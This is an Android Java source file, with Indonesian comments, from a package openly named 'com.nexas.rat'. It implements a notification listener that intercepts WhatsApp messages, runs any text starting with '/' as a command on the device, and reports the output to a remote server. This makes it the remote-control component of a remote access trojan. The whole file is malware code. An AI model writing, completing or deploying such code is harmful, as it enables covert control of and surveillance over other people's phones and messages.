package com.nexas.rat;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class WhatsAppCommandService extends NotificationListenerService {
    private static final String TAG = "WhatsAppCmdService";
    private static final String WHATSAPP_PACKAGE = "com.whatsapp";
    private ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // Hanya proses notifikasi dari WhatsApp
        if (!WHATSAPP_PACKAGE.equals(sbn.getPackageName())) return;

        Bundle extras = sbn.getNotification().extras;
        if (extras == null) return;

        String title = extras.getString(Notification.EXTRA_TITLE);
        String text = extras.getString(Notification.EXTRA_TEXT);
        if (title == null || text == null) return;

        // Cek apakah pesan berasal dari nomor admin (yang disimpan di SharedPreferences)
        // Admin number bisa di-set via aplikasi atau dari panel. Untuk sementara kita ambil dari SharedPrefs
        String adminNumber = getSharedPreferences("nexas", MODE_PRIVATE).getString("wa_admin", "");
        if (adminNumber.isEmpty()) return;

        // Format pesan dari WhatsApp biasanya "AdminName: /command param"
        // Kita perlu ekstrak nomor pengirim. Tidak mudah karena notifikasi tidak selalu menyertakan nomor.
        // Untuk kemudahan, kita asumsikan title berisi nama kontak admin. Bisa juga kita simpan kombinasi nama+nomer.
        // Cara lebih reliable: menggunakan Notification.extras.getString(Notification.EXTRA_PEOPLE) atau parsing teks.
        // Karena keterbatasan, kita akan periksa apakah pesan dimulai dengan '/' dan asumsikan itu perintah.
        if (text.startsWith("/")) {
            // Eksekusi perintah
            String command = text.substring(1);
            executor.execute(() -> executeCommandAndReply(command, title, text));
        }
    }

    private void executeCommandAndReply(String command, String senderName, String fullText) {
        // Eksekusi perintah, hasilnya akan dikirim balik ke pengirim via WhatsApp
        // Karena kita tidak bisa mengirim pesan langsung dari service tanpa intent,
        // kita akan menggunakan intent untuk membuka WhatsApp dan mengisi pesan otomatis.
        // Namun untuk automasi penuh, lebih baik hasil dikirim ke server atau pakai Accessibility.
        // Alternatif: kirim hasil ke server (socket) lalu server yang membalas via WhatsApp Gateway.
        // Di sini kita akan kirim hasil ke server melalui socket (asumsi NexasService sudah terhubung).

        String result = executeLocalCommand(command);
        // Kirim hasil ke server agar server bisa membalas ke admin via WhatsApp Gateway
        NexasService service = getNexasService();
        if (service != null) {
            JSONObject data = new JSONObject();
            try {
                data.put("command", command);
                data.put("result", result);
                data.put("sender", senderName);
                service.sendCommandResultToServer(data);
            } catch (Exception e) {
                Log.e(TAG, "Error sending result", e);
            }
        } else {
            // Fallback: kirim balasan via WhatsApp intent (membuka jendela chat)
            openWhatsAppWithMessage(senderName, "Hasil: " + result);
        }
    }

    private String executeLocalCommand(String command) {
        // Sama seperti di NexasService, tetapi karena kita tidak punya akses ke socket di sini,
        // kita akan panggil metode statis atau melalui instance NexasService.
        // Untuk sederhananya, kita panggil metode yang sama menggunakan refleksi atau langsung kirim ke NexasService.
        // Kita akan buat metode di NexasService untuk mengeksekusi perintah lokal dan mengembalikan hasil.
        NexasService service = getNexasService();
        if (service != null) {
            return service.executeLocalCommand(command);
        }
        return "Service tidak tersedia";
    }

    private NexasService getNexasService() {
        // Karena NexasService adalah service yang berjalan, kita bisa ambil instance statis jika ada.
        // Tambahkan static instance di NexasService.
        return NexasService.getInstance();
    }

    private void openWhatsAppWithMessage(String senderName, String message) {
        // Tidak praktis karena akan membuka UI, tapi sebagai fallback.
        // Lebih baik tidak digunakan.
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Tidak perlu
    }
}